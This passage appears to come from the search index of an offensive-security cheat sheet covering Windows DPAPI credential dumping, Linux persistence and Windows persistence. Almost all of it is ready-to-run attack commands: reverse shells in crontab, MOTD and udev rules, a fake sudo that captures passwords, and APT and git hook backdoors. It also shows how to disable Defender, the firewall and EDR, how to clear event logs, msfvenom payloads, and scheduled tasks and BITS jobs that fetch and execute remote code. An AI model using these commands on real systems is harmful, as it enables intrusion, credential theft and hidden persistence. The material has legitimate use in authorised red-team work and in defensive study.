[System.Security.Cryptography.DataProtectionScope]::LocalMachine)\n[System.Text.Encoding]::ASCII.GetString($b)\n</code></pre>"},{"location":"redteam/evasion/windows-dpapi/#mimikatz-credential-manager-dpapi","title":"Mimikatz - Credential Manager &amp; DPAPI","text":"<pre><code># check the folder to find credentials\ndir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n\n# check the file with mimikatz\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n# find master key\nmimikatz !sekurlsa::dpapi\n# use master key\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n\n# find and export backup keys\nlsadump::backupkeys /system:dc01.lab.local /export\n# use backup keys\ndpapi::masterkey /in:\"C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n</code></pre>"},{"location":"redteam/evasion/windows-dpapi/#hekatomb-steal-all-credentials-on-domain","title":"Hekatomb - Steal all credentials on domain","text":"<p>Processus-Thief/Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.</p> <pre><code>pip3 install hekatomb\nhekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp\n</code></pre> <p></p>"},{"location":"redteam/evasion/windows-dpapi/#donpapi-dumping-dpapi-credz-remotely","title":"DonPAPI - Dumping DPAPI credz remotely","text":"<ul> <li>login-securite/DonPAPI</li> </ul> <pre><code>DonPAPI.py domain/user:passw0rd@target\nDonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain/user@target\n\n# using domain backup key\ndpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip\npython DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list\n</code></pre>"},{"location":"redteam/evasion/windows-dpapi/#references","title":"References","text":"<ul> <li>DPAPI - Extracting Passwords - HackTricks</li> <li>DON PAPI, OU L\u2019ART D\u2019ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurit\u00e9 - CORTO GUEGUEN - 4 MARS 2022</li> </ul>"},{"location":"redteam/persistence/linux-persistence/","title":"Linux - Persistence","text":""},{"location":"redteam/persistence/linux-persistence/#summary","title":"Summary","text":"<ul> <li>Basic reverse shell</li> <li>Add a root user</li> <li>Suid Binary</li> <li>Crontab - Reverse shell</li> <li>Backdooring a user's bash_rc</li> <li>Backdooring a startup service</li> <li>Backdooring a user startup file</li> <li>Backdooring Message of the Day</li> <li>Backdooring a driver</li> <li>Backdooring the APT</li> <li>Backdooring the SSH</li> <li>Backdooring Git</li> <li>Additional Linux Persistence Options</li> <li>References</li> </ul>"},{"location":"redteam/persistence/linux-persistence/#basic-reverse-shell","title":"Basic reverse shell","text":"<pre><code>ncat --udp -lvp 4242\nncat --sctp -lvp 4242\nncat --tcp -lvp 4242\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#add-a-root-user","title":"Add a root user","text":"<pre><code>sudo useradd -ou 0 -g 0 john\nsudo passwd john\necho \"linuxpassword\" | passwd --stdin john\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#suid-binary","title":"Suid Binary","text":"<pre><code>TMPDIR2=\"/var/tmp\"\necho 'int main(void){setresuid(0, 0, 0);system(\"/bin/sh\");}' &gt; $TMPDIR2/croissant.c\ngcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2&gt;/dev/null\nrm $TMPDIR2/croissant.c\nchown root:root $TMPDIR2/croissant\nchmod 4777 $TMPDIR2/croissant\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#crontab-reverse-shell","title":"Crontab - Reverse shell","text":"<pre><code>(crontab -l ; echo \"@reboot sleep 200 &amp;&amp; ncat 192.168.1.2 4242 -e /bin/bash\")|crontab 2&gt; /dev/null\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#backdooring-a-users-bash_rc","title":"Backdooring a user's bash_rc","text":"<p>(FR/EN Version)</p> <pre><code>TMPNAME2=\".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\"\ncat &lt;&lt; EOF &gt; /tmp/$TMPNAME2\n  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale  = \"en\" ]; then echo -n \"[sudo] password for \\$USER: \";fi;if [ \\$locale  = \"fr\" ]; then echo -n \"[sudo] Mot de passe de \\$USER: \";fi;read -s pwd;echo; unalias sudo; echo \"\\$pwd\" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash &gt; /dev/null &amp;&amp; /usr/bin/sudo -S '\nEOF\nif [ -f ~/.bashrc ]; then\n    cat /tmp/$TMPNAME2 &gt;&gt; ~/.bashrc\nfi\nif [ -f ~/.zshrc ]; then\n    cat /tmp/$TMPNAME2 &gt;&gt; ~/.zshrc\nfi\nrm /tmp/$TMPNAME2\n</code></pre> <p>or add the following line inside its .bashrc file.</p> <pre><code>$ chmod u+x ~/.hidden/fakesudo\n$ echo \"alias sudo=~/.hidden/fakesudo\" &gt;&gt; ~/.bashrc\n</code></pre> <p>and create the <code>fakesudo</code> script.</p> <pre><code>read -sp \"[sudo] password for $USER: \" sudopass\necho \"\"\nsleep 2\necho \"Sorry, try again.\"\necho $sudopass &gt;&gt; /tmp/pass.txt\n\n/usr/bin/sudo $@\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#backdooring-a-startup-service","title":"Backdooring a startup service","text":"<ul> <li>Edit <code>/etc/network/if-up.d/upstart</code> file   <pre><code>RSHELL=\"ncat $LMTHD $LHOST $LPORT -e \\\"/bin/bash -c id;/bin/bash\\\" 2&gt;/dev/null\"\nsed -i -e \"4i \\$RSHELL\" /etc/network/if-up.d/upstart\n</code></pre></li> </ul>"},{"location":"redteam/persistence/linux-persistence/#backdooring-message-of-the-day","title":"Backdooring Message of the Day","text":"<ul> <li>Edit <code>/etc/update-motd.d/00-header</code> file   <pre><code>echo 'bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1\"' &gt;&gt; /etc/update-motd.d/00-header\n</code></pre></li> </ul>"},{"location":"redteam/persistence/linux-persistence/#backdooring-a-user-startup-file","title":"Backdooring a user startup file","text":"<p>Linux, write a file in  <code>~/.config/autostart/NAME_OF_FILE.desktop</code></p> <pre><code>In : ~/.config/autostart/*.desktop\n\n[Desktop Entry]\nType=Application\nName=Welcome\nExec=/var/lib/gnome-welcome-tour\nAutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide\nOnlyShowIn=GNOME;\nX-GNOME-Autostart-enabled=false\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#backdooring-a-driver","title":"Backdooring a driver","text":"<pre><code>echo \"ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"\" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules &gt; /dev/null\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#backdooring-the-apt","title":"Backdooring the APT","text":"<p>If you can create a file on the apt.conf.d directory with: <code>APT::Update::Pre-Invoke {\"CMD\"};</code> Next time \"apt-get update\" is done, your CMD will be executed!</p> <pre><code>echo 'APT::Update::Pre-Invoke {\"nohup ncat -lvp 1234 -e /bin/bash 2&gt; /dev/null &amp;\"};' &gt; /etc/apt/apt.conf.d/42backdoor\n</code></pre>"},{"location":"redteam/persistence/linux-persistence/#backdooring-the-ssh","title":"Backdooring the SSH","text":"<p>Add an ssh key into the <code>~/.ssh</code> folder.</p> <ol> <li><code>ssh-keygen</code></li> <li>write the content of <code>~/.ssh/id_rsa.pub</code> into <code>~/.ssh/authorized_keys</code></li> <li>set the right permission, 700 for ~/.ssh and 600 for authorized_keys</li> </ol>"},{"location":"redteam/persistence/linux-persistence/#backdooring-git","title":"Backdooring Git","text":"<p>Backdooring git can be a useful way to obtain persistence without the need for root access. Special care must be taken to ensure that the backdoor commands create no output, otherwise the persistence is trivial to notice.</p>"},{"location":"redteam/persistence/linux-persistence/#git-configs","title":"Git Configs","text":"<p>There are multiple git config variables that execute arbitrary commands when certain actions are taken. As an added bonus, git configs can be specified multiple ways leading to additional backdoor opportunities. Configs can be set at the user level (<code>~/.gitconfig</code>), at the repository level (<code>path/to/repo/.git/config</code>), and sometimes via environment variables.</p> <p><code>core.editor</code> is executed whenever git needs to provide the user with an editor (e.g. <code>git rebase -i</code>, <code>git commit --amend</code>). The equivalent environment variable is <code>GIT_EDITOR</code>.</p> <pre><code>[core]\neditor = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ${VISUAL:-${EDITOR:-emacs}}\n</code></pre> <p><code>core.pager</code> is executed whenever git needs to potentially large amounts of data (e.g. <code>git diff</code>, <code>git log</code>, <code>git show</code>). The equivalent environment variable is <code>GIT_PAGER</code>.</p> <pre><code>[core]\npager = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ${PAGER:-less}\n</code></pre> <p><code>core.sshCommand</code> is executed whenever git needs to interact with a remote ssh repository (e.g. <code>git fetch</code>, <code>git pull</code>, <code>git push</code>). The equivalent environment variable is <code>GIT_SSH</code> or <code>GIT_SSH_COMMAND</code>.</p> <pre><code>[core]\nsshCommand = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ssh\n[ssh]\nvariant = ssh\n</code></pre> <p>Note that <code>ssh.variant</code> (<code>GIT_SSH_VARIANT</code>) is technically optional, but without it git will run <code>sshCommand</code> twice in rapid succession.  (The first run is to determine the SSH variant and the second to pass it the correct parameters.)</p>"},{"location":"redteam/persistence/linux-persistence/#git-hooks","title":"Git Hooks","text":"<p>Git hooks are programs you can place in a hooks directory to trigger actions at certain points during git's execution. By default, hooks are stored in a repository's <code>.git/hooks</code> directory and are run when their name matches the current git action and the hook is marked as executable (i.e. <code>chmod +x</code>). Potentially useful hook scripts to backdoor:</p> <ul> <li><code>pre-commit</code> is run just before <code>git commit</code> is executed.</li> <li><code>pre-push</code> is run just before <code>git push</code> is executed.</li> <li><code>post-checkout</code> is run just after <code>git checkout</code> is executed.</li> <li><code>post-merge</code> is run after <code>git merge</code> or after <code>git pull</code> applies new changes.</li> </ul> <p>In addition to spawning a backdoor, some of the above hooks can be used to sneak malicious changes into a repo without the user noticing.</p> <p>Lastly, it is possible to globally backdoor all of a user's git hooks by setting the <code>core.hooksPath</code> git config variable to a common directory in the user-level git config file (<code>~/.gitconfig</code>).  Note that this approach will break any existing repository-specific git hooks.</p>"},{"location":"redteam/persistence/linux-persistence/#additional-persistence-options","title":"Additional Persistence Options","text":"<ul> <li>SSH Authorized Keys</li> <li>Compromise Client Software Binary</li> <li>Create Account</li> <li>Create Account: Local Account</li> <li>Create or Modify System Process</li> <li>Create or Modify System Process: Systemd Service</li> <li>Event Triggered Execution: Trap </li> <li>Event Triggered Execution</li> <li>Event Triggered Execution: .bash_profile and .bashrc</li> <li>External Remote Services</li> <li>Hijack Execution Flow</li> <li>Hijack Execution Flow: LD_PRELOAD</li> <li>Pre-OS Boot</li> <li>Pre-OS Boot: Bootkit</li> <li>Scheduled Task/Job </li> <li>Scheduled Task/Job: At (Linux)</li> <li>Scheduled Task/Job: Cron</li> <li>Server Software Component</li> <li>Server Software Component: SQL Stored Procedures</li> <li>Server Software Component: Transport Agent </li> <li>Server Software Component: Web Shell </li> <li>Traffic Signaling</li> <li>Traffic Signaling: Port Knocking</li> <li>Valid Accounts: Default Accounts </li> <li>Valid Accounts: Domain Accounts 2</li> </ul>"},{"location":"redteam/persistence/linux-persistence/#references","title":"References","text":"<ul> <li>@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289</li> <li>https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/</li> <li>http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html</li> <li>http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/</li> <li>Pouki from JDI</li> </ul>"},{"location":"redteam/persistence/windows-persistence/","title":"Windows - Persistence","text":""},{"location":"redteam/persistence/windows-persistence/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Hide Your Binary</li> <li>Disable Antivirus and Security<ul> <li>Antivirus Removal</li> <li>Disable Windows Defender</li> <li>Disable Windows Firewall</li> <li>Clear System and Security Logs</li> </ul> </li> <li>Simple User<ul> <li>Registry HKCU</li> <li>Startup</li> <li>Scheduled Tasks User</li> <li>BITS Jobs</li> </ul> </li> <li>Serviceland<ul> <li>IIS</li> <li>Windows Service</li> </ul> </li> <li>Elevated<ul> <li>Registry HKLM<ul> <li>Winlogon Helper DLL</li> <li>GlobalFlag</li> </ul> </li> <li>Startup Elevated</li> <li>Services Elevated</li> <li>Scheduled Tasks Elevated</li> <li>Binary Replacement<ul> <li>Binary Replacement on Windows XP+</li> <li>Binary Replacement on Windows 10+</li> </ul> </li> <li>RDP Backdoor<ul> <li>utilman.exe</li> <li>sethc.exe</li> </ul> </li> <li>Remote Desktop Services Shadowing</li> <li>Skeleton Key</li> <li>Virtual Machines</li> <li>Windows Subsystem for Linux</li> </ul> </li> <li>Domain<ul> <li>Golden Certificate</li> <li>Golden Ticket</li> </ul> </li> <li>References</li> </ul>"},{"location":"redteam/persistence/windows-persistence/#tools","title":"Tools","text":"<ul> <li>SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r</li> </ul>"},{"location":"redteam/persistence/windows-persistence/#hide-your-binary","title":"Hide Your Binary","text":"<p>Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.</p> <pre><code>PS&gt; attrib +h mimikatz.exe\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#disable-antivirus-and-security","title":"Disable Antivirus and Security","text":""},{"location":"redteam/persistence/windows-persistence/#antivirus-removal","title":"Antivirus Removal","text":"<ul> <li>Sophos Removal Tool.ps1</li> <li>Symantec CleanWipe</li> <li>Elastic EDR/Security <pre><code>cd \"C:\\Program Files\\Elastic\\Agent\\\"\nPS C:\\Program Files\\Elastic\\Agent&gt; .\\elastic-agent.exe uninstall\nElastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y\nElastic Agent has been uninstalled.\n</code></pre></li> <li>Cortex XDR <pre><code># Global uninstall password: Password1\nPassword hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db\nLook for PasswordHash, PasswordSalt or password, salt strings.\n\n# Disable Cortex: Change the DLL to a random value, then REBOOT\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f\n\n# Disables the agent on startup (requires reboot to work)\ncytool.exe startup disable\n\n# Disables protection on Cortex XDR files, processes, registry and services\ncytool.exe protect disable\n\n# Disables Cortex XDR (Even with tamper protection enabled)\ncytool.exe runtime disable\n\n# Disables event collection\ncytool.exe event_collection disable\n</code></pre></li> </ul>"},{"location":"redteam/persistence/windows-persistence/#disable-windows-defender","title":"Disable Windows Defender","text":"<pre><code># Disable Defender\nsc config WinDefend start= disabled\nsc stop WinDefend\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n## Exclude a process / location\nSet-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\"\nAdd-MpPreference -ExclusionProcess 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\nAdd-MpPreference -ExclusionPath C:\\Video, C:\\install\n\n# Disable scanning all downloaded files and attachments, disable AMSI (reactive)\nPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus\nPS C:\\&gt; Set-MpPreference -DisableIOAVProtection $true\n# Disable AMSI (set to 0 to enable)\nPS C:\\&gt; Set-MpPreference -DisableScriptScanning 1 \n\n# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\n\n# Wipe currently stored definitions\n# Location of MpCmdRun.exe: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\&lt;antimalware platform version&gt;\nMpCmdRun.exe -RemoveDefinitions -All\n\n# Remove signatures (if Internet connection is present, they will be downloaded again):\nPS &gt; &amp; \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\nPS &gt; &amp; \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n\n# Disable Windows Defender Security Center\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f\n\n# Disable Real Time Protection\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#disable-windows-firewall","title":"Disable Windows Firewall","text":"<pre><code>Netsh Advfirewall show allprofiles\nNetSh Advfirewall set allprofiles state off\n\n# ip whitelisting\nNew-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#clear-system-and-security-logs","title":"Clear System and Security Logs","text":"<pre><code>cmd.exe /c wevtutil.exe cl System\ncmd.exe /c wevtutil.exe cl Security\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#simple-user","title":"Simple User","text":"<p>Set a file as hidden</p> <pre><code>attrib +h c:\\autoexec.bat\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#registry-hkcu","title":"Registry HKCU","text":"<p>Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows.</p> <pre><code>Value name:  Backdoor\nValue data:  C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\n</code></pre> <p>Using the command line </p> <pre><code>reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\n</code></pre> <p>Using SharPersist</p> <pre><code>SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#startup","title":"Startup","text":"<p>Create a batch script in the user startup folder.</p> <pre><code>PS C:\\&gt; gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat\nstart /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\n</code></pre> <p>Using SharPersist</p> <pre><code>SharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m add\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#scheduled-tasks-user","title":"Scheduled Tasks User","text":"<ul> <li>Using native schtask - Create a new task     <pre><code># Create the scheduled tasks to run once at 00.00\nschtasks /create /sc ONCE /st 00:00 /tn \"Device-Synchronize\" /tr C:\\Temp\\revshell.exe\n# Force run it now !\nschtasks /run /tn \"Device-Synchronize\"\n</code></pre></li> <li> <p>Using native schtask - Leverage the <code>schtasks /change</code> command to modify existing scheduled tasks     <pre><code># Launch an executable by calling the ShellExec_RunDLL function.\nSCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE\n</code></pre></p> </li> <li> <p>Using Powershell     <pre><code>PS C:\\&gt; $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\"\nPS C:\\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User \"Rasta\"\nPS C:\\&gt; $P = New-ScheduledTaskPrincipal \"Rasta\"\nPS C:\\&gt; $S = New-ScheduledTaskSettingsSet\nPS C:\\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S\nPS C:\\&gt; Register-ScheduledTask Backdoor -InputObject $D\n</code></pre></p> </li> <li> <p>Using SharPersist     <pre><code># Add to a current scheduled task\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\n\n# Add new task\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\n</code></pre></p> </li> </ul>"},{"location":"redteam/persistence/windows-persistence/#bits-jobs","title":"BITS Jobs","text":"<pre><code>bitsadmin /create backdoor\nbitsadmin /addfile backdoor \"http://10.10.10.10/evil.exe\"  \"C:\\tmp\\evil.exe\"\n\n# v1\nbitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\evil.exe NUL\nbitsadmin /SetMinRetryDelay \"backdoor\" 60\nbitsadmin /resume backdoor\n\n# v2 - exploit/multi/script/web_delivery\nbitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\"\nbitsadmin /resume backdoor\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#serviceland","title":"Serviceland","text":""},{"location":"redteam/persistence/windows-persistence/#iis","title":"IIS","text":"<p>IIS Raid \u2013 Backdooring IIS Using Native Modules</p> <pre><code>$ git clone https://github.com/0x09AL/IIS-Raid\n$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS\nC:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:Module Name /image:\"%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\" /add:true\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#windows-service","title":"Windows Service","text":"<p>Using SharPersist</p> <pre><code>SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#elevated","title":"Elevated","text":""},{"location":"redteam/persistence/windows-persistence/#registry-hklm","title":"Registry HKLM","text":"<p>Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows.</p> <pre><code>Value name:  Backdoor\nValue data:  C:\\Windows\\Temp\\backdoor.exe\n</code></pre> <p>Using the command line </p> <pre><code>reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#winlogon-helper-dll","title":"Winlogon Helper DLL","text":"<p>Run executable during Windows logon</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; evilbinary.exe\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll &gt; evilbinary.dll\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"Userinit.exe, evilbinary.exe\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /d \"explorer.exe, evilbinary.exe\" /f\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, evilbinary.exe\" -Force\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, evilbinary.exe\" -Force\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#globalflag","title":"GlobalFlag","text":"<p>Run executable after notepad is killed</p> <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#startup-elevated","title":"Startup Elevated","text":"<p>Create a batch script in the user startup folder.</p> <pre><code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp \n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#services-elevated","title":"Services Elevated","text":"<p>Create a service that will start automatically or on-demand.</p> <pre><code># Powershell\nNew-Service -Name \"Backdoor\" -BinaryPathName \"C:\\Windows\\Temp\\backdoor.exe\" -Description \"Nothing to see here.\" -StartupType Automatic\nsc start pentestlab\n\n# SharPersist\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c backdoor.exe\" -n \"Backdoor\" -m add\n\n# sc\nsc create Backdoor binpath= \"cmd.exe /k C:\\temp\\backdoor.exe\" start=\"auto\" obj=\"LocalSystem\"\nsc start Backdoor\n</code></pre>"},{"location":"redteam/persistence/windows-persistence/#scheduled-tasks-elevated","title":"Scheduled Tasks Elevated","text":"<p>Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.</p> <p>Processes spawned as scheduled tasks have taskeng.exe process as their parent</p> <pre><code># Powershell\n$A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\temp\\backdoor.exe\"\n$T = New-ScheduledTaskTrigger -Daily -At 9am\n# OR\n$T = New-ScheduledTaskTrigger -Daily -At \"9/30/2020 11:05:00 AM\"\n$P = New-ScheduledTaskPrincipal \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest\n$S = New-ScheduledTaskSettingsSet\n$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S\nRegister-ScheduledTask \"Backdoor\" -InputObject $D\n\n# Native schtasks\nschtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr C:\\tools\\shell.cmd /ru \"SYSTEM\"\nschtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr calc /ru \"SYSTEM\" /s dc-mantvydas /u user /p password\nschtasks /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn [TaskName] /tr \"regsvr32.exe -s \\\"C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\"\" /SC ONCE /Z /ST [Time] /ET [Time]\n\n##(X86) - On User Login\nschtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System\n\n##(X86) - On System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object 